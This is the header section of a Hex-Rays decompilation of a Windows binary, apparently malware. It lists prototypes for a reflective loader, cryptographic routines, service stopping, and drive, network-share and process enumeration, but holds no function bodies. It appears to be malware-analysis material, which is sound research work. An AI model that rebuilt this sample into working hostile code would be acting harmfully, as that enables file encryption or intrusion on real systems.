/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

void __stdcall __noreturn StartAddress(PVOID Parameter);
int sub_401150();
void sub_4012D0();
void __noreturn start();
int sub_4017E0();
// int __usercall sub_401870@<eax>(const WCHAR *a1@<edi>);
// const WCHAR *__usercall sub_401940@<eax>(const WCHAR *a1@<ebx>);
void sub_401A20(LPCSTR lpString, ...);
void __cdecl __noreturn sub_401B00(int a1);
int __thiscall sub_401B60(FILETIME *lpFileTime); // idb
ULONG __stdcall sub_401BB0(const unsigned __int16 *Parameter);
int sub_401E90();
int (__cdecl *sub_402040())(unsigned __int16 *psz2, void *a2);
int sub_4021E0();
int sub_402230();
int *__cdecl sub_402280(__int64 a1);
// int __usercall sub_4022F0@<eax>(void *a1@<ebx>, int a2, void *lpBuffer, signed __int64 a4, void (__cdecl *a5)(int, void *, DWORD));
HANDLE __cdecl sub_4024D0(DWORD dwProcessId);
ULONG __stdcall sub_4025B0(PVOID Parameter); // idb
BOOL sub_4026B0();
SC_HANDLE __cdecl sub_402730(LPCWSTR lpServiceName);
const WCHAR *sub_402890();
// WCHAR *__usercall sub_403060@<eax>(WCHAR *result@<eax>);
void sub_403180();
unsigned int __cdecl sub_4032A0(unsigned int a1, unsigned int *a2, unsigned int a3);
int __cdecl sub_4032F0(unsigned __int16 *psz2, void *a2);
int sub_403510();
void __stdcall __noreturn sub_403900(PVOID Parameter);
int __thiscall sub_403920(void *this);
void sub_4039A0();
int __thiscall sub_403A30(void *this);
void *sub_403B40();
void (__stdcall *__stdcall ReflectiveLoader(void *a1))(int, int, void *);
int __cdecl sub_403F20(LPNETRESOURCEW lpNetResource); // idb
DWORD sub_404050();
PVOID sub_404180();
// BOOL __usercall sub_4043B0@<eax>(const BYTE *a1@<eax>, DWORD dwDataLen, BYTE *a3);
// int __usercall sub_404490@<eax>(int result@<eax>, int a2);
DWORD sub_404500();
// int __usercall sub_4045C0@<eax>(DWORD a1@<edi>, UINT uExitCode);
int sub_4046B0();
BOOL sub_404760();
int sub_404970();
DWORD sub_404B60();
// int __usercall sub_404C10@<eax>(ULONG (__stdcall *a1)(PVOID Parameter)@<edi>, void *a2@<esi>, int a3);
int sub_404C70();
char *sub_404D40();
LPVOID __cdecl sub_404E00(int a1, int a2);
BOOL __cdecl sub_404E20(LPVOID lpMem);
// BOOL __usercall sub_404E40@<eax>(DWORD a1@<eax>, HANDLE hFile, LARGE_INTEGER liDistanceToMove);
void __cdecl sub_404E60(LPCSTR lpString2);
BOOL __cdecl sub_4050D0(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
LPSTR sub_405180();
LPVOID sub_405320();
// CHAR *__usercall sub_4053E0@<eax>(const WCHAR *a1@<ebx>);
signed int sub_405440();
// int __usercall sub_405580@<eax>(_DWORD *a1@<eax>, const __m128i *a2, int a3);
// int __usercall sub_4056E0@<eax>(unsigned int *a1@<edi>, _BYTE *a2, unsigned int a3, int a4, int a5);
int __cdecl sub_4057F0(_DWORD *a1, _DWORD *a2, const __m128i *a3, const __m128i *a4);
// int __usercall sub_4059A0@<eax>(_DWORD *a1@<eax>, _DWORD *a2, const __m128i *a3, const __m128i *a4);
// int __usercall sub_405B50@<eax>(_DWORD *a1@<ebx>);
int sub_405EC0();
// int __usercall sub_4060E0@<eax>(_DWORD *a1@<eax>, int a2);
int __cdecl sub_406620(unsigned int a1, unsigned int *a2);
// int __usercall sub_406D00@<eax>(unsigned int a1@<eax>, int a2, const __m128i *a3);
// int __usercall sub_406F60@<eax>(_DWORD *a1@<ebx>, int a2@<esi>);
// int __usercall sub_407060@<eax>(int a1@<eax>, unsigned int a2@<edi>, const __m128i *a3);
int __cdecl sub_407150(_DWORD *a1, unsigned int a2, unsigned int a3, const __m128i *a4, unsigned int a5);
int __cdecl sub_4072A0(_DWORD *a1, unsigned int a2, unsigned int a3);
// int __usercall sub_4072C0@<eax>(_DWORD *a1@<esi>);
// int __usercall sub_407370@<eax>(unsigned int a1@<eax>, _DWORD *a2@<edx>, const __m128i *a3@<ecx>, char a4);
int __cdecl sub_407410(_DWORD *a1);
int __cdecl sub_4074E0(_DWORD *a1, unsigned int a2, unsigned int a3);
// int __usercall sub_4076A0@<eax>(_DWORD *a1@<esi>);
// int __usercall sub_4076F0@<eax>(unsigned int a1@<ebx>, int a2@<esi>);
// int __usercall sub_407770@<eax>(_DWORD *a1@<eax>, _DWORD *a2);
// int __usercall sub_407880@<eax>(int a1@<ebx>, _DWORD *a2@<esi>);
// int __usercall sub_407920@<eax>(int a1@<eax>);
int __cdecl sub_4079B0(_DWORD *a1, const char *a2);
// int __usercall sub_407AB0@<eax>(int result@<eax>, int *a2@<ecx>);
// int __usercall sub_407B20@<eax>(_DWORD *a1@<esi>, const __m128i *a2, unsigned int a3);
int __fastcall sub_407CC0(unsigned int a1, int a2, int a3);
// int __usercall sub_407D70@<eax>(unsigned int a1@<eax>, int a2@<esi>);
// int __usercall sub_407EC0@<eax>(unsigned int a1@<eax>, _DWORD *a2@<ecx>);
// int __usercall sub_407FA0@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_408030@<eax>(int *a1@<eax>, int *a2@<ecx>);
// int __usercall sub_4080E0@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>, _DWORD *a3);
// unsigned int *__usercall sub_408290@<eax>(unsigned int *result@<eax>, int a2@<edx>, int a3);
// int __usercall sub_4082F0@<eax>(int a1@<eax>, int a2@<edi>, int a3);
// int __usercall sub_4083C0@<eax>(_DWORD *a1@<eax>, int *a2@<ebx>, _DWORD *a3@<esi>);
// int __usercall sub_408430@<eax>(_DWORD *a1@<eax>, int *a2@<ebx>, _DWORD *a3@<esi>);
unsigned int __cdecl sub_4084A0(unsigned int a1, unsigned int *a2, unsigned int *a3, unsigned int a4);
// int __usercall sub_408710@<eax>(int *a1@<esi>, int *a2, int *a3);
// int __usercall sub_408990@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
int __cdecl sub_4089C0(int *a1, int *a2, int *a3);
// int __usercall sub_408F10@<eax>(int *a1@<eax>, int *a2@<esi>, int *a3);
// int __usercall sub_409080@<eax>(int a1@<eax>, int *a2);
int __cdecl sub_4090D0(int a1, int a2, int a3, int a4, int a5);
int __fastcall sub_4091F0(int a1, int a2, int a3, int a4);
// int __usercall sub_409230@<eax>(int a1@<eax>, _DWORD *a2, int *a3, int a4, int *a5);
// void __usercall sub_4098E0(_DWORD *a1@<esi>);
// int __usercall sub_409940@<eax>(_DWORD *a1@<edi>, int a2@<esi>);
// int __usercall sub_409970@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_409990@<eax>(unsigned __int8 *a1@<eax>, _DWORD *a2);
// int __usercall sub_40ABF0@<eax>(int result@<eax>, int a2@<ebx>, __m128i *a3);
// int __usercall sub_40AC90@<eax>(_BYTE *a1@<edi>, int *a2@<esi>);
int __cdecl sub_40ADE0(__m128i *a1, int a2, _BYTE *a3);
int __cdecl sub_40AE60(int a1, BYTE *pbBuffer, DWORD dwLen, _DWORD *phProv);
int __cdecl sub_40AED0(int a1, _DWORD *a2, unsigned int a3, _DWORD *a4);
// int __usercall sub_40AF00@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// int __usercall sub_40B000@<eax>(int a1@<eax>, int a2);
// int __usercall sub_40BF50@<eax>(int a1@<esi>, const __m128i *a2, unsigned int a3);
// int __usercall sub_40C010@<eax>(_BYTE *a1@<edi>, int a2@<esi>);
// int __usercall sub_40C4D0@<eax>(_BYTE *a1@<edi>, const __m128i *a2, unsigned int a3, int a4);
int __cdecl sub_40C550(_DWORD *a1);
int __cdecl sub_40C590(int a1, __m128i *a2, int a3);
int __cdecl sub_40C5B0(int a1, _BYTE *a2);
int sub_40C5D0();
int __cdecl sub_40C600(LPVOID lpMem);
void __cdecl sub_40C630(void *a1, const void *a2);
int __cdecl sub_40C650(_DWORD *a1, unsigned __int8 *a2);
int __cdecl sub_40C670(int a1, __m128i *a2, unsigned int a3);
int __cdecl sub_40C690(int a1, _BYTE *a2);
int sub_40C6B0();
int __cdecl sub_40C6E0(_DWORD *a1, unsigned __int8 *a2);
int __cdecl sub_40C700(_DWORD *a1);
int __cdecl sub_40C740(int a1, __m128i *a2, int a3);
int __cdecl sub_40C760(int *a1, _BYTE *a2);
void __cdecl sub_40C780(void *a1, const void *a2);
int __cdecl sub_40C7A0(LPVOID lpMem);
int __cdecl sub_40C7D0(_DWORD *a1, unsigned __int8 *a2);
int __cdecl sub_40C7F0(_DWORD *a1);
int __cdecl sub_40C850(unsigned int *a1, const __m128i *a2, int a3);
int __cdecl sub_40C870(int *a1, _BYTE *a2);
int __cdecl sub_40C890(const __m128i *a1, int a2, _BYTE *a3);
int sub_40C930();
int __cdecl sub_40C960(LPVOID lpMem);
void __cdecl sub_40C990(void *a1, const void *a2);
int __cdecl sub_40C9B0(_DWORD *a1, int a2);
int __cdecl sub_40C9D0(_DWORD *a1);
int __cdecl sub_40CA20(const __m128i *a1, int a2, _BYTE *a3);
int __cdecl sub_40CAC0(_DWORD *a1);
int __cdecl sub_40CB60(int a1, const __m128i *a2, unsigned int a3);
int __cdecl sub_40CB80(int a1, _BYTE *a2);
int __cdecl sub_40CBA0(const __m128i *a1, unsigned int a2, _BYTE *a3);
int sub_40CCB0();
int __cdecl sub_40CCE0(LPVOID lpMem);
void __cdecl sub_40CD10(void *a1, const void *a2);
int __cdecl sub_40CD30(int a1, int a2);
int __cdecl sub_40CD50(_DWORD *a1);
int __cdecl sub_40CD60(const __m128i *a1, unsigned int a2, _BYTE *a3);
// int __usercall sub_40CDE0@<eax>(unsigned __int8 *a1@<eax>, _DWORD *a2);
// int __usercall sub_40D7D0@<eax>(int result@<eax>, int a2@<ebx>, __m128i *a3);
// int __usercall sub_40D870@<eax>(_BYTE *a1@<edi>, int a2@<esi>);
int __cdecl sub_40D9A0(__m128i *a1, int a2, _BYTE *a3);
// int __usercall sub_40DA30@<eax>(int a1@<eax>, _DWORD *a2);
// int __usercall sub_40E460@<eax>(int result@<eax>, unsigned int *a2@<ebx>, const __m128i *a3);
// int __usercall sub_40E500@<eax>(_BYTE *a1@<edi>, int *a2@<esi>);
// int __usercall sub_40E6B0@<eax>(unsigned __int8 *a1@<eax>, _DWORD *a2);
// int __usercall sub_410280@<eax>(int a1@<ebx>, __m128i *a2, unsigned int a3);
// int __usercall sub_410320@<eax>(int a1@<eax>, _BYTE *a2@<edi>);
int __cdecl sub_410450(__m128i *a1, unsigned int a2, _BYTE *a3);
__m128i *__cdecl sub_411800(const __m128i *a1, __m128i *a2);
int __cdecl sub_4119B0(const __m128i *a1, __m128i *a2);
int __cdecl sub_411BB0(const __m128i *a1, __m128i *a2);
int __cdecl sub_411F54(int a1, __m128i *a2, int a3, int a4, const __m128i *a5, unsigned int a6);
int __cdecl sub_412B00(int a1, __m128i *a2, int a3, int a4, const __m128i *a5, unsigned int a6);
int __cdecl sub_412EF0(int a1, __m128i *a2, int a3, int a4, const __m128i *a5, unsigned int a6);
int __cdecl sub_413350(int a1, __m128i *a2, int a3, int a4, const __m128i *a5, unsigned int a6);
// void __usercall sub_413818(int a1@<edi>, int a2@<esi>, int a3, int a4, int a5);
// BOOL __usercall sub_413941@<eax>(int a1@<edi>);
// int __usercall sub_413966@<eax>(int a1@<edi>, int a2, int a3, int a4, int a5, int a6);
// int __usercall sub_413993@<eax>(int a1@<edi>);
void __cdecl sub_4139A3(LPVOID lpMem);
int __cdecl sub_4139DD(int a1);
DWORD *sub_413A1F();
DWORD *sub_413A32();
DWORD *__cdecl sub_413A45(DWORD a1);
int sub_413A68();
// void __usercall sub_413B19(int a1@<edi>);
// void __usercall sub_413B39(int a1@<edi>, unsigned int a2);
// void __usercall sub_413B7A(int a1@<edi>, int a2, int a3);
void __cdecl sub_413BAC(unsigned int a1);
void __cdecl sub_413BE8(int a1, int a2);
// int __userpurge sub_413C17@<eax>(int a1@<ecx>, int a2@<edi>, _DWORD *a3);
// int __usercall SEH_415480@<eax>(int a1@<edx>, PEXCEPTION_RECORD ExceptionRecord, char *TargetFrame, int a4);
void sub_413E8F();
// int __usercall sub_413E97@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, char a7);
int __cdecl sub_413EB0(int a1, unsigned __int8 a2, unsigned int a3);
char *__cdecl sub_413F30(_DWORD *a1);
// void *__usercall sub_413FBB@<eax>(void *a1@<edi>, SIZE_T dwBytes);
LPVOID __cdecl sub_414000(unsigned int a1, unsigned int a2);
PVOID sub_41404C();
void *sub_414055();
void __cdecl sub_414089(int a1, int a2);
DWORD *sub_41413D();
// DWORD *__usercall sub_4141B6@<eax>(int a1@<edi>);
HMODULE __cdecl sub_4141D0(int a1);
void __cdecl __noreturn sub_4141FB(UINT uExitCode); // idb
void __cdecl sub_414213(UINT uExitCode, int a2, int a3);
void __cdecl sub_414353(UINT uExitCode);
// void __usercall __noreturn sub_414369(int a1@<edi>, int a2);
LPVOID __cdecl sub_414387(unsigned int a1, unsigned int a2);
void __cdecl sub_4143C7(int a1);
int __cdecl sub_4143DE(int a1);
// void __usercall sub_4144A0(int a1@<edi>, int a2);
// int __usercall sub_4144D3@<eax>(int a1@<edi>);
int __cdecl sub_41456F(_DWORD *a1);
// int __usercall sub_4145D7@<eax>(int *a1@<edi>, _DWORD *a2);
int __cdecl sub_41461F(int a1);
int sub_4146F9();
// int __usercall sub_414702@<eax>(int a1@<edi>, int a2);
// int __usercall sub_414758@<eax>(int a1@<edi>, int a2);
// int __usercall sub_41477E@<eax>(int a1@<eax>);
// _BYTE *__usercall sub_4147AD@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_414811@<eax>(int a1@<esi>);
// volatile LONG *__usercall sub_4149A1@<eax>(int a1@<edi>);
// UINT __usercall sub_414A45@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_414AC1@<eax>(int a1@<edi>, int a2, _DWORD *a3);
// int __usercall sub_414CAA@<eax>(int a1@<edi>, int a2);
// int __usercall sub_414E44@<eax>(int a1@<edi>);
LONG __cdecl sub_414E62(volatile LONG *lpAddend);
volatile LONG *__cdecl sub_414EF1(volatile LONG *lpAddend);
void __cdecl sub_414F8A(char *lpMem);
volatile LONG *__cdecl sub_4150D5(volatile LONG **a1, volatile LONG *lpAddend);
// DWORD __usercall sub_415122@<eax>(int a1@<edi>);
// int __usercall sub_41519B@<eax>(int a1@<edi>, unsigned __int8 a2, _DWORD *a3);
// int __usercall sub_4151D3@<eax>(int a1@<edi>, unsigned __int8 a2);
// int __usercall sub_415290@<eax>(int a1@<ebp>, _DWORD *a2, int a3, unsigned int a4);
int __thiscall sub_415382(int (*this)(void));
int __fastcall sub_415399(int (__fastcall *a1)(_DWORD, _DWORD), int a2);
void __fastcall sub_4153B2(PVOID TargetFrame, PEXCEPTION_RECORD ExceptionRecord);
int __fastcall sub_4153CB(int a1, unsigned int a2, int a3, _DWORD *a4);
BOOL __cdecl sub_4153F0(int a1);
int __cdecl sub_415430(int a1, unsigned int a2);
BOOL __cdecl sub_415480(int a1);
// BOOL __usercall sub_41553C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, char a7);
int sub_4156FC();
// LPVOID __usercall sub_41573D@<eax>(LPVOID a1@<edi>, SIZE_T dwBytes);
LPVOID __cdecl sub_4157D1(unsigned int a1, unsigned int a2, _DWORD *a3);
unsigned int __cdecl sub_415930(unsigned int a1, const __m128i *a2, unsigned int a3);
void __cdecl sub_415C91(int a1);
// void __usercall __noreturn sub_415CB1(int a1@<edi>, int a2@<esi>);
// unsigned int __usercall sub_415CEA@<eax>(int a1@<edx>, unsigned int a2);
PVOID sub_415D21();
int __cdecl sub_415D2E(int a1);
BOOL __cdecl sub_415ED1(int a1);
int sub_415EF9();
wchar_t *__cdecl sub_415F2A(int a1);
void *__cdecl sub_415F50(int a1);
// void *__usercall sub_4160FF@<eax>(int a1@<edi>);
int __cdecl sub_416138(int a1);
// int __usercall sub_4161A5@<eax>(int a1@<edi>, unsigned int a2);
int __cdecl sub_416219(int a1, const void *a2, DWORD nNumberOfBytesToWrite);
// int __usercall sub_416916@<eax>(int *a1@<edi>, int a2, const void *a3, DWORD nNumberOfBytesToWrite);
// int __usercall sub_4169EA@<eax>(int *a1@<edi>, int a2);
int __cdecl sub_416AC3(int a1, LCID Locale, DWORD dwMapFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpDestStr, int cchDest, UINT CodePage, int a9); // idb
// int __usercall sub_416CAA@<eax>(int a1@<edi>, _DWORD *a2, LCID Locale, DWORD dwMapFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpDestStr, int cchDest, UINT CodePage, int a10);
BOOL __cdecl sub_416CF0(int a1, DWORD dwInfoType, LPCCH lpMultiByteStr, int cbMultiByte, LPWORD lpCharType, UINT CodePage, int a7);
// BOOL __usercall sub_416DD7@<eax>(int a1@<edi>, _DWORD *a2, DWORD dwInfoType, LPCCH lpMultiByteStr, int cbMultiByte, LPWORD lpCharType, UINT CodePage, int a8, int a9);
void __cdecl sub_416E17(LPVOID *a1);
void __cdecl sub_41718E(int a1);
void __cdecl sub_4171F7(int a1);
// __int64 __usercall sub_4172F5@<edx:eax>(int a1@<edi>, int a2, int a3, int a4, DWORD dwMoveMethod);
// void __usercall __noreturn sub_41737A(int a1@<edi>);
_DWORD __cdecl sub_4173B0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// int __usercall sub_4173F5@<eax>(int a1@<ebp>, int a2, unsigned int a3);
BOOL sub_417479();
void __stdcall sub_41749C(int a1);
// int __userpurge sub_4174A5@<eax>(int result@<eax>, int a2@<ebp>, int a3);
// int __usercall sub_4174C4@<eax>(int (*a1)(void)@<eax>);
// LONG __userpurge TopLevelExceptionFilter@<eax>(int a1@<edi>, int a2@<esi>, struct _EXCEPTION_POINTERS *ExceptionInfo);
int sub_41760C();
// void __usercall __noreturn sub_41764C(int a1@<edi>, int a2@<esi>);
int __cdecl sub_41767F(int a1, int a2, int a3);
// int __usercall sub_4177EB@<eax>(__int16 *a1@<ecx>, int a2@<edi>, char *a3, int a4, __int16 *a5);
// int __usercall sub_417860@<eax>(__int16 *a1@<ecx>, int a2@<edi>, _WORD *a3, int a4, __int16 *a5, int a6);
int __cdecl sub_41792D(_WORD *a1);
// int __usercall sub_417948@<eax>(int a1@<ecx>, int a2@<edi>, char *a3, int a4, char *a5);
// int __usercall sub_4179AB@<eax>(int a1@<edi>, int a2);
// int __usercall sub_4179EA@<eax>(int a1@<edi>, int a2);
// int __usercall sub_417A86@<eax>(int *a1@<edi>, int a2);
int __cdecl sub_417B4A(int a1);
__int16 __cdecl sub_417B7B(__int16 Buffer);
// int __usercall sub_417BBD@<eax>(int a1@<edi>, LPWSTR lpWideCharStr, LPCCH lpMultiByteStr, unsigned int a4, _DWORD *a5);
// int __usercall sub_417CD3@<eax>(int a1@<edi>, LPWSTR lpWideCharStr, LPCCH lpMultiByteStr, int a4);
int __cdecl sub_417D1B(int a1);
// int __usercall sub_417DA1@<eax>(int a1@<edi>, int a2);
BOOL __cdecl sub_417E0A(int a1);
void __cdecl sub_417EA9(int a1);
HANDLE sub_418060();
HANDLE sub_41807F();
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
char *__cdecl sub_4180E0(char *a1, unsigned __int8 *a2);
int __stdcall sub_4184E0(unsigned __int64 a1, __int64 a2);
unsigned int __stdcall sub_418590(unsigned __int64 a1, __int64 a2);
// unsigned __int64 __usercall sub_418600@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);
unsigned __int64 __stdcall sub_418620(unsigned __int64 a1, __int64 a2);
// int __stdcall GetModuleFileNameExW(_DWORD, _DWORD, _DWORD, _DWORD); weak

//-------------------------------------------------------------------------
// Data declarations

char byte_405120[3] = { '\x0F', '1', '\xA3' }; // weak
_UNKNOWN loc_415320; // weak
_UNKNOWN loc_4153C6; // weak
// extern BOOL (__stdcall *CryptGetHashParam)(HCRYPTHASH hHash, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);
// extern BOOL (__stdcall *CryptAcquireContextA)(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
// extern BOOL (__stdcall *CryptDestroyHash)(HCRYPTHASH hHash);
// extern BOOL (__stdcall *CryptHashData)(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern BOOL (__stdcall *SetKernelObjectSecurity)(HANDLE Handle, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR SecurityDescriptor);
// extern BOOL (__stdcall *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern SC_HANDLE (__stdcall *OpenServiceW)(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *FileTimeToSystemTime)(const FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *SetThreadPriorityBoost)(HANDLE hThread, BOOL bDisablePriorityBoost);
// extern void (__stdcall *GetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern DWORD_PTR (__stdcall *SetThreadAffinityMask)(HANDLE hThread, DWORD_PTR dwThreadAffinityMask);
// extern BOOL (__stdcall *SetProcessShutdownParameters)(DWORD dwLevel, DWORD dwFlags);
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern UINT (__stdcall *GetSystemWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *Wow64DisableWow64FsRedirection)(PVOID *OldValue);
// extern BOOL (__stdcall *Wow64RevertWow64FsRedirection)(PVOID OlValue);
// extern LONG (__stdcall *UnhandledExceptionFilter)(struct _EXCEPTION_POINTERS *ExceptionInfo);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern BOOL (__stdcall *IsDebuggerPresent)();
// extern PVOID (__stdcall *EncodePointer)(PVOID Ptr);
// extern PVOID (__stdcall *DecodePointer)(PVOID Ptr);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern LONG (__stdcall *InterlockedDecrement)(volatile LONG *lpAddend);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *InitializeCriticalSectionAndSpinCount)(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount);
// extern BOOL (__stdcall *GetCPInfo)(UINT CodePage, LPCPINFO lpCPInfo);
// extern UINT (__stdcall *GetACP)();
// extern UINT (__stdcall *GetOEMCP)();
// extern BOOL (__stdcall *IsValidCodePage)(UINT CodePage);
// extern BOOL (__stdcall *IsProcessorFeaturePresent)(DWORD ProcessorFeature);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern LPVOID (__stdcall *HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern UINT (__stdcall *GetConsoleCP)();
// extern BOOL (__stdcall *GetConsoleMode)(HANDLE hConsoleHandle, LPDWORD lpMode);
// extern int (__stdcall *LCMapStringW)(LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest);
// extern BOOL (__stdcall *GetStringTypeW)(DWORD dwInfoType, LPCWCH lpSrcStr, int cchSrc, LPWORD lpCharType);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *WriteConsoleW)(HANDLE hConsoleOutput, const void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved);
// extern BOOL (__stdcall *SetStdHandle)(DWORD nStdHandle, HANDLE hHandle);
// extern HANDLE (__stdcall *GetCurrentThread)();
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetLogicalDriveStringsW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern BOOL (__stdcall *SystemTimeToTzSpecificLocalTime)(const TIME_ZONE_INFORMATION *lpTimeZoneInformation, const SYSTEMTIME *lpUniversalTime, LPSYSTEMTIME lpLocalTime);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *GetProcessHandleCount)(HANDLE hProcess, PDWORD pdwHandleCount);
